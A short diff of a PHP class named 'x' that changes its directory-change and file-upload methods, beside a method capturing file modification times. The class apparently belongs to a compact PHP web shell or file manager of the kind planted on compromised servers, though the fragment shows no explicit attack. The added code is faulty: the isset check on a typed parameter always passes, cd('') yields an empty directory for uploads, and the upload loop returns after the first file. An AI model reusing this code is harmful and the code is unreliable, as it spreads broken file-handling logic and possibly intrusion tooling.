@@ -174,7 +174,12 @@ class x {
     	return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
     }
     public function cd(string $directory) {
-    	return chdir($directory);
+    	if (isset($directory)) {
+    		$this->dir = $directory;
+    		@chdir($this->dir);
+    	} else {
+    		$this->dir = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
+    	} return $this->dir;
     }
     public function changeTime($filename) {
         if (file_exists($filename)) $this->cft = filemtime($filename);
@@ -204,7 +209,7 @@ class x {
     public function upload(array $file) {
     	$this->files = count($file['tmp_name']);
     	for ($i=0; $i < $this->files ; $i++) { 
-    		return copy($file['tmp_name'][$i], $this->cwd . $file['name'][$i]);
+    		return copy($file['tmp_name'][$i], $this->cd("") . $file['name'][$i]);
     	}
     }
     public function size($filename) {
